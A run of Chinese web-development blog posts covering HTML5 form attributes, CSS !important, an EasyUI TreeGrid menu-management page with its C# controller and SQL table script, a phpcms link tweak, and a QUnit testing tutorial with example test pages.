等到各大浏览器都支持良好了,就能取代JS日期选择器了…. 一条代码搞定一个日期选择;

date - 选取日、月、年
month - 选取月、年
week - 选取周和年
time - 选取时间（小时和分钟）
datetime - 选取时间、日、月、年（UTC 时间）
datetime-local - 选取时间、日、月、年（本地时间）

search
<input type="search" name="user_search" > 

跟text相比,多了一个可关闭的X;还有一些样式上的区别;其他基本一致

tel
联系方式： <input type="tel" name="user_tel" > 

和text大同小异,支持任何字符输入

color
最喜欢的颜色： <input type="color" name="color" > 

这个属性兼容性不是很好,但是可以支持的浏览器体验很好,就是一个color picker!!!

required
邮箱: <input type="email" name="user_email" required="required">

防止域为空时提交表单,返回值是boolean, 设置了必须通过验证才能提交

placeholder
邮箱: <input type="email" name="user_email" required="required" placeholder="请输入您的邮箱!!">

这个属性见怪不怪了,,有点类似占位符,显示一行浅灰色的字体,但是又是可以编辑的,也可以通过JS获取当输入为空的时候,用placeholder的值替换

pattern
电话号码: <input type="text" name="phone"
pattern="[1-9]{11}" title="联系人号码" />

目前很少看到, 但是正则却很常见,,待慢慢普及吧

novalidate
<form action="#" method="post" novalidate="true">
邮箱: <input type="email" name="user_email" required="required" placeholder="请输入您的邮箱!!" novalidate="true">
<input type="submit" />
</form>

H5特性之一,验证表单值;
novalidate的作用就是取消验证,可作用于表单和input元素;
默认不设置则为验证!

multiple
<form action="#" method="post" novalidate="true">
邮箱: <input type="email" name="user_email" required="required" placeholder="请输入您的邮箱!!" novalidate="true" multiple="multiple">
<input type="submit" />
</form>

支持上传(file)和邮箱控件(email)输入多个值,值之间用逗号隔开(半角)

autofocus
    <input autofocus="autofocus" type="text">

自动获取焦点

autocomplete
    <input autofocus="autofocus" type="text" autocomplete="no">

h5下该属性增加了开关功能(on/off),来决定是否自动完成


表单新元素
datalist
搜索引擎: <input type="url" list="url_list" name="link" />
        <datalist id="url_list">
            <option label="Bing" value="http://www.bing.com" />
            <option label="Baidu" value="http://www.baidu.com" />
            <option label="Microsoft" value="http://www.microsoft.com" />
        </datalist>

如需把 datalist 绑定到输入域，请用输入域的 list 属性引用 datalist 的 id
下拉默认值设置在option的value中

keygen
<form action="#" method="post">
用户名: <input type="text" name="usr_name" >
加密方式: <keygen name="security" >
<input type="submit" >
</form>

很多浏览器对这属性支持还不大完善,,,,
加密方式两种,原理还是通过公钥和密钥的方式(类似SSH)

progress
<progress value="5" max="70">
</progress>

进度条制作利器!!,用来判断file这些的加载挺不错的….
必须设置max值才能显示对应的进度条,,不支持百分比!!!

meter
<div>您的额度：<meter value="50001" min="0" max="10000" low="1000" high="9000" optimum="6000">尽情耍!!</meter> </div>

用的不多,,目前;也是进度条效果
min/max是最小值和最大值;
value是当前值
low和high是低于和高于最优值(optimum)


总结
表单来了一次大跃进,但是吧,,目前还是没法顺心的用,,一些浏览器没跟上,还有一些用户使用老版本浏览器; 
所以这些新特性的使用,,哪怕再人性化,也只能慢慢来;过渡总需要时间的~~~

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        

版权声明：本文为博主原创文章，未经博主允许不得转载。

CSS 之！important
今天写代码，碰到一个关于!important的问题。由于之前并没有好好理解这个概念，所以今天特意查了下资料做个总结。


CSS的原理：

我们知道，CSS写在不同的地方有不同的优先级， .css文件中的定义 < 元素style中的属性，但是如果使用!important，事情就会变得不一样。

首先，先看下面一段代码：


<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>测试Css中的!Important区别</title> 
</head> 
<style type="text/css">
.testClass{ 
color:blue !important;
}
</style>
<body>
    <div class="testClass" style="color:red;">
        测试Css中的Important
    </div>
</body>
</html>


虽然元素的style中有testClass类的定义，但是在上面的css定义中的用!important限定的定义却是优先级最高的，无论是在ie6-10或者Firefox和Chrome表现都是一致的，都显示蓝色。

这种情况也同时可以说明ie6是可以识别!important的，只是这个是ie6的一个缺陷吧。如果写成下面的样式，ie6是识别不出来的：
.testClass{ 
color:blue !important;
color:red;
}

这样，在ie6下展示的时候会显示成红色。

当然，也可以通过以下方式来让ie6识别：

.testClass{ 
color:blue !important; 
} 
.testClass{ 
color:red; 
}

通过以上方式也是可以让ie6显示成蓝色的。

以上实例说明使用!important的css定义是拥有最高的优先级的。只是在ie6下出了一点小的bug，注意书写方式一般可以轻松避开的。



版权声明：本文为博主原创文章，未经博主允许不得转载。

EasyUI的TreeGrid应用
权限系统的菜单管理采用了EasyUI的TreeGrid，实现了菜单管理的新增、删除、修改、初始化、拖拽改变顺序或层级等，贴出代码：
1、view页面
<link rel="stylesheet" type="text/css" href="/content/js/easyui/themes/default/easyui.css">
<link rel="stylesheet" type="text/css" href="/content/js/easyui/themes/icon.css">
<link rel="stylesheet" type="text/css" href="/content/js/easyui/demo/demo.css">
<script type="text/javascript" src="/content/js/easyui/jquery.min.js"></script>
<script type="text/javascript" src="/content/js/easyui/jquery.easyui.min.js"></script>

<table id="syscaidan" title="菜单管理" class="easyui-treegrid" style="width:100%;"></table>

<script>
    $(function() {
       
        $('#syscaidan').treegrid({
            loadMsg: '数据加载中,请稍后……',
            url: 'listdata',
            lines: true,
            rownumbers: false,
            idField: 'syscaidanid',
            treeField: 'mingcheng',
            toolbar:[{  
                text:'新增外部菜单',iconCls:'icon-add',handler:function(){  
                    window.location.href='edit';  
                }  },  
                {
                    text: '加载最新菜单', iconCls: 'icon-reload', handler: function () {
                        $('#syscaidan').treegrid('reload');
                }  
                },
                {
                    text: '恢复到原始状态', iconCls: 'icon-tip', handler: function () {
                        if (confirm("该操作将重置所有菜单，确定进行初始化？")) {
                            $.getJSON("chushihua", function (json) {
                                alert(json.msg);
                                if (json.success == true)
                                    $('#syscaidan').treegrid('reload');
                            });
                        }
                    }
                }
            ],
            columns: [
                [
                    { field: 'mingcheng', title: '菜单名称', width: 200 },
                    { field: 'biaoshi', title: '菜单标示', width: 100 },
                    { field: 'yuanshimingcheng', title: '原始名称', width: 100 },
                    { field: 'tanchu', title: '是否弹出', width: 100 },
                    { field: 'shifouxianshi', title: '是否显示', width: 100 },
                    { field: 'leixing', title: '类型', width: 100 },
                    { field: 'tianjiariqi', title: '添加日期', width: 100 },
                    {
                        field: 'syscaidanid',
                        title: '操作',
                        width: 100,
                        align: 'center',
                        formatter: function(value, row, index) {
                            var editbtn = '', delbtn = '';
                            if (row.shangji != -1)
                                var editbtn = '<a href="edit?syscaidanid=' + row.syscaidanid + '" class="ope-edit" >修改</a> ';
                            if (row.leixing == '人工添加')
                                delbtn = '<a href="javascript:void(0)" class="ope-delete" onclick="del(' + row.syscaidanid + ')">删除</a>';
                            return editbtn + delbtn;
                        }
                    }
                ]
            ],
            onLoadSuccess: function(row) {
                //启用拖动排序
                enableDnd($('#syscaidan'));
            }
        });
    });

    //删除
    function del(syscaidanid) {
        if (confirm("确定要删除吗？")) {
            $.getJSON("delete?syscaidanid=" + syscaidanid, function (json) {
                alert(json.msg);
                if(json.success==true)
                    $('#syscaidan').treegrid('reload');
            });
        }
    }

    //拖动实现
    function enableDnd(t) {
        var nodes = t.treegrid('getPanel').find('tr[node-id]');
        nodes.find('span.tree-hit').bind('mousedown.treegrid', function () {
            return false;
        });
        nodes.draggable({
            disabled: false,
            revert: true,
            cursor: 'pointer',
            proxy: function (source) {
                var p = $('<div class="tree-node-proxy tree-dnd-no"></div>').appendTo('body');
                p.html($(source).find('.tree-title').html());
                p.hide();
                return p;
            },
            deltaX: 15,
            deltaY: 15,
            onBeforeDrag: function () {
                $(this).next('tr.treegrid-tr-tree').find('tr[node-id]').droppable({ accept: 'no-accept' });
            },
            onStartDrag: function () {
                $(this).draggable('proxy').css({
                    left: -10000,
                    top: -10000
                });
            },
            onDrag: function (e) {
                $(this).draggable('proxy').show();
                this.pageY = e.pageY;
            },
            onStopDrag: function () {
                $(this).next('tr.treegrid-tr-tree').find('tr[node-id]').droppable({ accept: 'tr[node-id]' });
            }
        }).droppable({
            accept: 'tr[node-id]',
            onDragOver: function (e, source) {

                //拖拽的菜单必须无子菜单
                var d = $("#" + source.id).find('.tree-collapsed');
                var f = $("#" + source.id).find('.tree-expanded');
                if ((d.length + f.length) > 0) {
                    return ;
                }
                //控制菜单最多三级
                var level = $('#syscaidan').treegrid('getLevel', $("#" + e.target.id).attr('node-id'));
                if (level > 3)
                    return ;

                var pageY = source.pageY;
                var top = $(this).offset().top;
                var bottom = top + $(this).outerHeight();
                $(source).draggable('proxy').removeClass('tree-dnd-no').addClass('tree-dnd-yes');
                $(this).removeClass('row-append row-top row-bottom');
                if (pageY > top + (bottom - top) / 2) {
                    if (bottom - pageY < 5) {
                        $(this).addClass('row-bottom');
                    } else {
                        $(this).addClass('row-append');
                    }
                } else {
                    if (pageY - top < 5) {
                        $(this).addClass('row-top');
                    } else {
                        $(this).addClass('row-append');
                    }
                }
            },
            onDragLeave: function (e, source) {
                $(source).draggable('proxy').removeClass('tree-dnd-yes').addClass('tree-dnd-no');
                $(this).removeClass('row-append row-top row-bottom');
            },
            onDrop: function (e, source) {
                //拖拽的菜单必须无子菜单
                var d = $("#" + source.id).find('.tree-collapsed');
                var f = $("#" + source.id).find('.tree-expanded');
                if ((d.length + f.length) > 0) {
                    return alert("拖拽的菜单不能有子菜单！");
                }
                //控制菜单最多三级
                var level = $('#syscaidan').treegrid('getLevel', $("#" + e.target.id).attr('node-id'));
                if (level > 3)
                    return alert("菜单设置不能超过三级！");
                

                var action, point;
                if ($(this).hasClass('row-append')) {
                    action = 'append';
                } else {
                    action = 'insert';
                    point = $(this).hasClass('row-top') ? 'top' : 'bottom';
                }
                $(this).removeClass('row-append row-top row-bottom');
                //==================================
                //做自己的逻辑处理
                var src = $('#syscaidan').treegrid('find', $(source).attr('node-id'));
                var dest = $('#syscaidan').treegrid('find', $(this).attr('node-id'));
                //alert(src.mingcheng + "," + dest.mingcheng);
                //拖拽事件
                $.ajax({
                    url: 'tuozhuai',
                    dataType: 'json',
                    type: 'post',
                    data: {
                        "srcid": src.syscaidanid,
                        "destid": dest.syscaidanid
                    },
                    success: function (data) {
                        if (data.success) {
                            $('#syscaidan').treegrid('reload'); //重新加载treegrid        
                        }
                    }
                });
                //====================
            }
        });
    }

</script>



2、Controller方法
 /// <summary>
        /// 获取到所有菜单列表
        /// </summary>
        /// <param name="pb"></param>
        public static void listdata(pagebase pb)
        {
            ArrayList arr = new ArrayList();

            //取系统菜单,获取前先扫描一遍
            applicationhelper.reload();

            var xitongcaidan = applicationhelper.hasMenu;

            
            //全部菜单
            var quanbucaidans = queryhelper.query<_syscaidan>("select * from syscaidan order by paixu").ToList();
            
            //加载根目录
            arr.Add(new
            {
                syscaidanid = 0,
                biaoshi = "@root",
                yuanshimingcheng = "菜单目录",
                shangji = -1,
                mingcheng = "菜单目录",
                miaoshu = "菜单目录",
                tanchu = "否",
                shifouxianshi = "否",
                leixing = "系统",
                tianjiariqi = DateTime.Now.ToString("yyyy-MM-dd"),
                children = getzicaidan(0, quanbucaidans, xitongcaidan)//加载子菜单
            });

            //输出json
            pb.json(arr);
        }
        /// <summary>
        /// 获取菜单列表
        /// </summary>
        /// <param name="syscaidanid">父菜单ID</param>
        /// <param name="quanbucaidans">全部菜单列表</param>
        /// <param name="xitongcaidan">系统菜单列表</param>
        /// <returns></returns>
        public static ArrayList getzicaidan(int syscaidanid, List<_syscaidan> quanbucaidans, Dictionary<string, caidan> xitongcaidan)
        {
            ArrayList arr = new ArrayList();

            //取一级部门
            var zicaidans = from o in quanbucaidans where o.shangji == syscaidanid select o;
            //加载部门
            foreach (_syscaidan zicaidan in zicaidans)
            {
                //取原始名称
                var _caidan=new caidan();
                xitongcaidan.TryGetValue(zicaidan.biaoshi, out _caidan);

                arr.Add(new
                {
                    syscaidanid = zicaidan.syscaidanid,
                    biaoshi=zicaidan.biaoshi,
                    yuanshimingcheng =_caidan==null?"":_caidan.mingcheng,
                    shangji = zicaidan.shangji,
                    mingcheng = string.IsNullOrEmpty(zicaidan.mingcheng) ? _caidan == null ? "" : _caidan.mingcheng : zicaidan.mingcheng,
                    miaoshu = zicaidan.miaoshu,
                    tanchu = zicaidan.tanchu == 0 ? "否" : "是",
                    shifouxianshi = zicaidan.shifouxianshi==0?"否":"是",
                    leixing = zicaidan.leixing==0?"系统":"人工添加",
                    tianjiariqi = zicaidan.tianjiariqi.ToString("yyyy-MM-dd"),
                    children = getzicaidan(zicaidan.syscaidanid, quanbucaidans,xitongcaidan)
                });

               
            }
            return arr;
        }

        /// <summary>
        /// 编辑
        /// </summary>
        /// <param name="pb"></param>
        [layout("default_edit")]
        public static void edit(pagebase pb)
        {
            var id = pb.v_i(_syscaidan_.syscaidanid);
            if (id <= 0) return;
            //方法一
            string sql = "select * from syscaidan where syscaidanid=@0";
            var t = queryhelper.get<_syscaidan>(sql, id);

            pb["leixing"] = t.leixing;
            pb.autoloaddata(t);
        }

        /// <summary>
        /// 保存完毕
        /// </summary>
        /// <param name="pb"></param>
        public static void save(pagebase pb)
        {
            //这是一种情况
            _syscaidan syscaidan = pb.getmodel<_syscaidan>();

            if (syscaidan.syscaidanid <= 0)
            {
                syscaidan.tianjiariqi = DateTime.Now;
                syscaidan.leixing = 1;//类型：人工
            }

            if (syscaidan.saveorupdate().identity > 0)
                pb.back("保存成功!");
            else
                pb.back("保存失败!", false);
        }

        /// <summary>
        /// 删除
        /// </summary>
        /// <param name="pb"></param>
        public static void delete(pagebase pb)
        {
            //这是一种情况
            _syscaidan syscaidan = pb.getmodel<_syscaidan>();

            if (syscaidan.delete(true) > 0)
                pb.json(new { msg = "删除成功!", success = true });
            else
                pb.json(new { msg = "删除失败!", success = false });
        }

        /// <summary>
        /// 拖拽
        /// </summary>
        /// <param name="pb"></param>
        public static void tuozhuai(pagebase pb)
        {
            var srcid = pb.v_i("srcid");//要移动的
            if (srcid <= 0) return;
            var destid = pb.v_i("destid");//目标位置的
            if (destid < 0) return;

            string sql = "select * from syscaidan where syscaidanid=@0";
            var srcsyscaidan = queryhelper.get<_syscaidan>(sql, srcid);

            if (destid != 0)//目标位置不是根目录时
            {
                var destsyscaidan = queryhelper.get<_syscaidan>(sql, destid);
                srcsyscaidan.shangji = destsyscaidan.syscaidanid;
            }
            else
            {
                srcsyscaidan.shangji = 0;
            }

            var destmaxpaixu = queryhelper.get<int>("select num=max(paixu) from syscaidan where shangji=@0",destid);
            srcsyscaidan.paixu = ++destmaxpaixu;

             if (srcsyscaidan.saveorupdate().identity > 0)
                 pb.json(new { msg = "移动成功!", success = true });
            else
                 pb.json(new { msg = "移动失败!", success = false });
        }

        /// <summary>
        /// 初始化
        /// </summary>
        /// <param name="pb"></param>
        public static void chushihua(pagebase pb)
        {
            string sql = "delete from syscaidan ";
            var result = queryhelper.execute(sql);

            xitongcaidanchushihua();

            if (result >= 0)
                pb.json(new { msg = "初始化成功!", success = true });
            else
                pb.json(new { msg = "初始化失败!", success = false });
        }
        /// <summary>
        /// 系统菜单初始化
        /// </summary>
        public static void xitongcaidanchushihua()
        {
            //取系统菜单,获取前先扫描一遍
            applicationhelper.reload();
            var xitongcaidan = applicationhelper.hasMenu;
            //循环写入数据库
            if (xitongcaidan != null && xitongcaidan.Count > 0)
            {
                string sql = "";
                StringBuilder sqlsb = new StringBuilder();
                sqlsb.AppendLine("insert into syscaidan(biaoshi,mingcheng,path,leixing) values ");
                foreach (caidan _caidan in xitongcaidan.Values)
                {
                    sqlsb.AppendLine("('"+_caidan.biaoshi+"','"+_caidan.mingcheng+"','"+_caidan.path+"',0),");
                }
                sql = sqlsb.ToString().Trim();
                sql = sql.Substring(0, sql.Length - 1);
                queryhelper.execute(sql);
            }
        }
3、库表设计
/****** Object:  Table [dbo].[syscaidan]    Script Date: 2015/8/26 14:22:09 ******/
SET ANSI_NULLS ON
GO

SET QUOTED_IDENTIFIER ON
GO

CREATE TABLE [dbo].[syscaidan](
	[syscaidanid] [int] IDENTITY(1,1) NOT NULL,
	[path] [nvarchar](200) NULL,
	[biaoshi] [nvarchar](200) NULL,
	[shifouxianshi] [int] NULL,
	[leixing] [int] NULL,
	[shangji] [int] NULL,
	[paixu] [int] NULL,
	[tanchu] [int] NULL,
	[tianjiariqi] [datetime] NULL,
	[miaoshu] [nvarchar](500) NULL,
	[mingcheng] [nvarchar](200) NULL,
 CONSTRAINT [PK_syscaidan] PRIMARY KEY CLUSTERED 
(
	[syscaidanid] ASC
)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]
) ON [PRIMARY]

GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'菜单id' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'syscaidanid'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'菜单唯一系统标示，用于判断权限' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'path'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'标示' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'biaoshi'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'是否显示,0是不显示，1是显示' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'shifouxianshi'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'类型 0是系统 1是用户自定义' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'leixing'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'上级ID' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'shangji'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'排序，从小到大排序' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'paixu'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'点击菜单是否弹出 1弹出 0不弹出' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'tanchu'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'创建日期' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'tianjiariqi'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'描述' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'miaoshu'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'标题' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'mingcheng'
GO


4、实现效果

拖拽



有需要的童鞋，按照自己的业务逻辑改改就是了。



版权声明：本文为博主原创文章，未经博主允许不得转载。

phpcms v9 外部链接在新窗口打开
        在phpcms后台添加的外部链接都是在本页面打开，phpcms后台也乜有直接让外部链接打开新窗口的功能，接下来我会告诉你，在代码里加一个判断就完成。
如果你的外部链接是子栏目在列表中显示，那就找content下的list.html，如果是在单网页显示的就找page.html，如果是在导航 就找heard.html。找到连接的a标签，然后在a标签上一个判断：
<a href="{$r[url]}" {if $r[type]==2} target="_blank"{/if} ><span>{$r[catname]}</span></a>
因为外部链接类型的，在category表里和其他不同的是type字段的值是2，到这里就完美解决了。
总结：研究1个小时的成果，半个小时花在，在后台找在窗口打开的设置，麻的，好了不说了。

版权声明：本文为博主原创文章，未经博主允许不得转载。

javascript--QUnit【javascript单元测试框架】
QUnit官网
开源中国：http://www.oschina.net/p/qunit
参考：http://www.zhangxinxu.com/wordpress/2013/04/qunit-javascript-unit-test-单元测试/
    http://blog.csdn.net/cyq1984/article/details/6398596




一、断言（Assert）
async()
Instruct QUnit to wait for an asynchronous operation.
指导QUnit等待异步操作。


deepEqual()
A deep recursive comparison, working on primitive types, arrays, objects, regular expressions, dates and functions.
用于基本类型，数组，对象，正则表达式，日期和功能的深递归比较。


equal()
A non-strict comparison, roughly equivalent to JUnit’s assertEquals.
非严格的比较，大致相当于JUnit的assertEquals。

expect()
Specify how many assertions are expected to run within a test.
指定有多少断言，将会在运行测试中。


notDeepEqual()
An inverted deep recursive comparison, working on primitive types, arrays, objects, regular expressions, dates and functions.
用于基本类型，数组，对象，正则表达式，日期和功能的倒置深递归比较。

notEqual()
A non-strict comparison, checking for inequality.
非严格的比较，检查是否不平等。


notOk()
A boolean check, inverse of ok() and CommonJS’s assert.ok(), and equivalent to JUnit’s assertFalse(). Passes if the first argument is falsy.
一个布尔检查，ok()和CommonJS的的assert.ok（），并相当于JUnit的assertFalse（）。如果第一个参数是假的，则传递。

notPropEqual()
A strict comparison of an object’s own properties, checking for inequality.
严格的比较对象的自己的属性，检查是否不平等。


notStrictEqual()
A strict comparison, checking for inequality.
严格的比较，检查是否不平等。

ok()
A boolean check, equivalent to CommonJS’s assert.ok() and JUnit’s assertTrue(). Passes if the first argument is truthy.
一个布尔检查，相当于CommonJS的的assert.ok（）和JUnit的assertTrue（）。如果第一个参数是真的，则传递。

propEqual()
A strict type and value comparison of an object’s own properties.
比较一个对象的严格的类型和值。

push()
Report the result of a custom assertion
报告自定义断言的结果

strictEqual()
A strict type and value comparison.
比较严格的类型和值。


throws()
Test if a callback throws an exception, and optionally compare the thrown error.

如果回调抛出一个异常，以及可选比较抛出错误，则测试。



二、异步控制（Async Control）
async()
Instruct QUnit to wait for an asynchronous operation.

QUnit.asyncTest()
DEPRECATED: Add an asynchronous test to run. The test must include a call to QUnit.start().

QUnit.start()
PARTIALLY DEPRECATED: Start running tests again after the testrunner was stopped. See QUnit.stop() and QUnit.config.autostart.

QUnit.stop()
DEPRECATED: Increase the number of QUnit.start() calls the testrunner should wait for before continuing.

QUnit.test()
Add a test to run.



三、回调函数（callbacks）
When integrating QUnit into other tools like CI servers, use these callbacks as an API to read test results.

QUnit.begin()
Register a callback to fire whenever the test suite begins.

QUnit.done()
Register a callback to fire whenever the test suite ends.

QUnit.log()
Register a callback to fire whenever an assertion completes.

QUnit.moduleDone()
Register a callback to fire whenever a module ends.

QUnit.moduleStart()
Register a callback to fire whenever a module begins.

QUnit.testDone()
Register a callback to fire whenever a test ends.

QUnit.testStart()
Register a callback to fire whenever a test begins.




四、配置（configuration）
These methods and properties are used to configure QUnit: to adjust the runtime behaviour directly or extend the QUnit API via custom assertions.


QUnit.assert
Namespace for QUnit assertions

QUnit.config
Configuration for QUnit

QUnit.dump.parse()
Advanced and extensible data dumping for JavaScript

QUnit.extend()
Copy the properties defined by the mixin object into the target object

QUnit.init()
DEPRECATED: Re-initialize the test runner.

QUnit.push()
DEPRECATED: Report the result of a custom assertion

QUnit.reset()
DEPRECATED: Reset the test fixture in the DOM.





五、Test


QUnit.asyncTest()
DEPRECATED: Add an asynchronous test to run. The test must include a call to QUnit.start().
QUnit.module()
Group related tests under a single label.
QUnit.skip()
Adds a test like object to be skipped
QUnit.test()
Add a test to run.





六、实例


在测试页面添加两个文件：
qunit.css

qunit.js



本测试以qunit-1.18.0.css、qunit-1.18.0.js版本


1、基本例子
01.html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit Example</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css"/>
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>
  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <!--引入你需要测试的js-->
  <script src="tests.js"></script>
</body>
</html>tests.js
//base
QUnit.test( "hello test", function( assert ) {
  assert.ok( 1 == "1", "Passed!" );
});

结果





2、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--basicExample</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script>
    QUnit.test( "a basic test example", function( assert ) {
      var value = "hello";
      assert.equal( value, "hello", "We expect value to be hello" );
    });
  </script>
</body>
</html>
结果



3、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--ok()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script>
    QUnit.test( "ok test", function( assert ) {
      assert.ok( true, "true succeeds" );
      assert.ok( "non-empty", "non-empty string succeeds" );
     
      assert.ok( false, "false fails" );
      assert.ok( 0, "0 fails" );
      assert.ok( NaN, "NaN fails" );
      assert.ok( "", "empty string fails" );
      assert.ok( null, "null fails" );
      assert.ok( undefined, "undefined fails" );
    });
  </script>
</body>
</html>
结果



4、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--equal()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script>
    QUnit.test( "equal test", function( assert ) {
      assert.equal( 0, 0, "Zero, Zero; equal succeeds" );
      assert.equal( "", 0, "Empty, Zero; equal succeeds" );
      assert.equal( "", "", "Empty, Empty; equal succeeds" );
      assert.equal( 0, false, "Zero, false; equal succeeds" );
     
      assert.equal( "three", 3, "Three, 3; equal fails" );
      assert.equal( null, false, "null, false; equal fails" );
    });
  </script>
</body>
</html>
结果




5、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--deepEqual()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script>
    QUnit.test( "deepEqual test", function( assert ) {
      var obj = { foo: "bar" };
     
      assert.deepEqual( obj, { foo: "bar" }, "Two objects can be the same in value" );
    });
  </script>
</body>
</html>
结果




6、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--expect()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script>
    QUnit.test( "a test", function( assert ) {
      assert.expect( 2 );
     
      function calc( x, operation ) {
        return operation( x );
      }
     
      var result = calc( 2, function( x ) {
        assert.ok( true, "calc() calls operation function" );
        return x * x;
      });
     
      assert.equal( result, 4, "2 square equals 4" );
    });
  </script>
</body>
</html>


结果




7、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--expect()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    QUnit.test( "a test", function( assert ) {
      assert.expect( 1 );
     
      var $body = $( "body" );
     
      $body.on( "click", function() {
        assert.ok( true, "body was clicked!" );
      });
     
      $body.trigger( "click" );
    });
  </script>
</body>
</html>
结果




8、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--async()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>
  <input id="test-input"/>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    QUnit.test( "asynchronous test: async input focus", function( assert ) {
      var done = assert.async();
      var input = $( "#test-input" ).focus();
      setTimeout(function() {
        assert.equal( document.activeElement, input[0], "Input was focused" );
        done();
      });
    });
  </script>
</body>
</html>
结果




9、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--log()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    function KeyLogger( target ) {
      this.target = target;
      this.log = [];
     
      var that = this;
      this.target.off( "keydown" ).on( "keydown", function( event ) {
        that.log.push( event.keyCode );
      });
    }


    QUnit.test( "keylogger api behavior", function( assert ) {
      var doc = $( document ),
        keys = new KeyLogger( doc );
     
      // Trigger the key event
      doc.trigger( $.Event( "keydown", { keyCode: 9 } ) );
     
      // Verify expected behavior
      assert.deepEqual( keys.log, [ 9 ], "correct key was logged" );
    });
  </script>
</body>
</html>
